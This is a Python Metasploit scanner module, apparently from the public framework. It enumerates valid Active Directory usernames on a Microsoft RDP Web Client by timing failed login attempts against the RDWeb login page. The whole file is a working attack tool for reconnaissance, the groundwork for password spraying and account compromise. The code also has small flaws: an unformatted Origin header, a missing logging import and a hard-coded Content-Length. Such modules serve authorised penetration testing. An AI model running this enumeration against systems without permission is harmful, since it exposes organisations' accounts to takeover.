#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from metasploit import module

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True


# Metasploit Metadata
metadata = {
    'name': 'Microsoft RDP Web Client Login Enumeration',
    'description': '''
        Enumerate valid usernames against a Microsoft RDP Web Client by performing a timing based check against the provided username.
    ''',
    'authors': [
        'Matthew Dunn'
    ],
    'date': '2020-12-23',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'REPLACE ME'},
    ],
    'type': 'single_scanner',
    'options': {
        'targeturi': {'type': 'string', 'description': 'The base path to the RDP Web Client install',
                      'required': True, 'default': '/RDWeb/Pages/en-US/login.aspx'},
        'rhost': {'type': 'address', 'description': 'Host to target', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Port to target', 'required': True, 'default': 443},
        'domain': {'type': 'string', 'description': 'The target AD domain', 'required': True, 'default': None},
        'username': {'type': 'string', 'description': 'The username to verify', 'required': True, 'default': None},
        'cutoff_time': {'type': 'int',
                        'description': 'Minimum milliseconds for response to consider username invalid',
                        'required': True, 'default': 500}
    }
}


def check_username(rhost, rport, targeturi, domain, username, cutoff_time):
    """Check a single username against the RDWeb Client
    The cutoff_time is used to specify the amount of milliseconds where a
    response should consider the username invalid."""

    url = f'https://{rhost}:{rport}/{targeturi}'
    body = f'DomainUserName={domain}%5C{username}&UserPass=incorrect'
    headers = {'Host':rhost,
               'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
               'Content-Type': 'application/x-www-form-urlencoded',
               'Content-Length': '53',
               'Origin': 'https://{rhost}'}
    session = requests.Session()
    try:
        request = session.post(url, data=body, headers=headers, timeout=cutoff_time / 1000, verify=False)
        if request.status_code == 200:
            module.log(f'Username {domain}\{username} is valid! Response received in {request.elapsed.microseconds / 1000} milliseconds',
                       level='good')
    except requests.exceptions.Timeout:
            module.log(f'Username {domain}\{username} is invalid! No response received in {cutoff_time} milliseconds',
                       level='error')
    except requests.exceptions.RequestException as e:
        module.log('{}'.format(e), level='error')
        return


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    check_username(args['rhost'], args['rport'], args['targeturi'],
                   args['domain'], args['username'], int(args['cutoff_time']))


if __name__ == '__main__':
    module.run(metadata, run)
